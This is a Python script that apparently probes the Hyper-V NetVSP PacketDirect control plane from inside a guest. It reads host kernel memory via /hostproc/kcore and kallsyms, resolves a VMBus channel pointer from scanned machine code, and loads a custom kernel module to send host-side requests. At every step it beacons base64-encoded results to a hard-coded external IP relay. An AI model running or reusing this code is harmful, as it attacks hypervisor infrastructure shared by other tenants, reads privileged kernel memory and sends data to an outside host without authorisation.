#!/usr/bin/env python3
"""Walk the NVSP v6 PacketDirect API control plane on the live NetVSP channel.

Control-plane ops only (CONFIG, OPEN_PROVIDER, CREATE_QUEUE, ALLOC/FREE paths
are bounded request/completion exchanges). NvspMessage6TypePdPostBatch is
never sent: that handler is behind Microsoft's own "Security bug 9234257"
tripwire and stays out of scope for this probe.
"""

import base64
import glob
import json
import os
import struct
import subprocess
import time
import urllib.parse
import urllib.request

RELAY = "http://16.146.243.72:8450/MYTH_D3_PD"
NETVSC_CLASS = "f8615163-df3e-46c5-913f-f2d2f965ed0e"
MODULE = "/tmp/hvraw_pd.ko"
PARAMS = "/hostsys/module/hvraw_pd/parameters/"


def read_run_id():
    try:
        return open("/tmp/b_run_id").read().strip()
    except OSError:
        return ""


def beacon(payload):
    payload["run_id"] = read_run_id()
    data = base64.urlsafe_b64encode(json.dumps(payload, sort_keys=True).encode()).decode()
    try:
        urllib.request.urlopen(RELAY + "?d=" + urllib.parse.quote(data), timeout=3).read()
    except Exception:
        pass


class KCore:
    def __init__(self, path="/hostproc/kcore"):
        self.fd = os.open(path, os.O_RDONLY)
        header = os.pread(self.fd, 64, 0)
        fields = struct.unpack("<16sHHIQQQIHHHHHH", header)
        phoff, phentsize, phnum = fields[5], fields[9], fields[10]
        self.loads = []
        for index in range(phnum):
            raw = os.pread(self.fd, phentsize, phoff + index * phentsize)
            ptype, _, offset, vaddr, _, filesz, _, _ = struct.unpack("<IIQQQQQQ", raw[:56])
            if ptype == 1 and filesz:
                self.loads.append((vaddr, vaddr + filesz, offset))

    def read(self, address, length):
        for start, end, offset in self.loads:
            if start <= address and address + length <= end:
                return os.pread(self.fd, length, offset + address - start)
        raise ValueError("address not in kcore")


def symbol_address(name):
    with open("/hostproc/kallsyms") as stream:
        for line in stream:
            fields = line.split()
            if len(fields) >= 3 and fields[2] == name and fields[1].lower() == "t":
                return int(fields[0], 16)
    raise KeyError(name)


def channel_for_relid(kcore, relid):
    address = symbol_address("relid2channel")
    code = kcore.read(address, 160)
    for index in range(len(code) - 7):
        if not (code[index] in (0x48, 0x4C) and code[index + 1] == 0x8B
                and code[index + 2] & 0xC7 == 0x05):
            continue
        displacement = struct.unpack("<i", code[index + 3:index + 7])[0]
        global_address = address + index + 7 + displacement
        try:
            array_address = struct.unpack("<Q", kcore.read(global_address, 8))[0]
            channel_address = struct.unpack(
                "<Q", kcore.read(array_address + relid * 8, 8))[0]
        except (ValueError, struct.error):
            continue
        if channel_address > 0xffff000000000000:
            return channel_address
    raise RuntimeError("relid2channel array not resolved")


def netvsc_primary_relid():
    for class_path in glob.glob("/hostsys/bus/vmbus/devices/*/class_id"):
        value = open(class_path).read().strip().strip("{}").lower()
        if value != NETVSC_CLASS:
            continue
        device_dir = os.path.dirname(class_path)
        for channel_dir in sorted(glob.glob(device_dir + "/channels/*")):
            sub_path = channel_dir + "/subchannel_id"
            try:
                if open(sub_path).read().strip() == "0":
                    return int(os.path.basename(channel_dir)), device_dir
            except OSError:
                continue
    raise RuntimeError("netvsc primary channel not found")


def write_param(name, value):
    open(PARAMS + name, "w").write(str(value) + "\n")


def dmesg_tail(marker):
    out = subprocess.run(["dmesg"], capture_output=True, text=True).stdout
    lines = [line for line in out.splitlines() if "HVPD" in line]
    index = 0
    for position, line in enumerate(lines):
        if marker in line:
            index = position
    return lines[index:][-14:]


def run_op(op, settings, label):
    for name, value in settings.items():
        write_param(name, value)
    write_param("op", op)
    stamp = "op=%u" % op
    try:
        write_param("arm", 1)
    except OSError as error:
        return {"label": label, "op": op, "arm_errno": error.errno}
    time.sleep(0.3)
    lines = dmesg_tail(stamp)
    comp = next((l for l in lines if "HVPD comp" in l), "")
    return {"label": label, "op": op, "dmesg": lines[-8:], "comp": comp}


def main():
    result = {"status": "init"}
    try:
        relid, device_dir = netvsc_primary_relid()
        kcore = KCore()
        channel = channel_for_relid(kcore, relid)
        result.update({"relid": relid, "channel": hex(channel), "device": os.path.basename(device_dir)})
        beacon({"status": "channel_resolved", **result})

        if subprocess.run(["insmod", MODULE], capture_output=True).returncode != 0:
            # try modprobe-style fallback with explicit error capture
            load = subprocess.run(["insmod", MODULE], capture_output=True, text=True)
            result.update({"status": "insmod_failed", "stderr": load.stderr[-200:]})
            beacon(result)
            return
        write_param("channel", hex(channel))
        write_param("wait_ms", 1500)

        ops = []
        # S1: CONFIG with a null MMIO region (pure capability probe).
        ops.append(run_op(1, {"pa": 0, "len": 4096, "sub": 1}, "config_null"))
        beacon({"status": "progress", "ops": ops[-1:]})
        # S2: OPEN_PROVIDER id 0.
        ops.append(run_op(3, {"prov": 0, "a": 0}, "open_provider0"))
        beacon({"status": "progress", "ops": ops[-1:]})
        # S3: ALLOC_COM_BUF 4 KiB region 1 (host-side bookkeeping; completion
        # format returns pa/len/region when supported).
        ops.append(run_op(8, {"len": 4096, "region": 1}, "alloc_com_buf"))
        beacon({"status": "progress", "ops": ops[-1:]})
        # S4: CREATE_QUEUE recv on provider 0 (only meaningful if open worked).
        ops.append(run_op(5, {"prov": 0, "q": 0, "a": 1, "len": 2048}, "create_recv_q"))
        beacon({"status": "progress", "ops": ops[-1:]})
        # S5 LAST (self-risk only): SW_DATAPATH guest_pd_enabled=1 then revert.
        ops.append(run_op(2, {"a": 0, "b": 1}, "sw_dpath_enable"))
        beacon({"status": "progress", "ops": ops[-1:]})
        ops.append(run_op(2, {"a": 0, "b": 0}, "sw_dpath_revert"))

        result.update({"status": "done", "ops": ops})
    except Exception as error:
        result.update({"status": "error", "error": "%s:%s" % (type(error).__name__, error)})
    finally:
        open("/tmp/d3-pd-result.json", "w").write(json.dumps(result, sort_keys=True) + "\n")
        beacon(result)


if __name__ == "__main__":
    main()
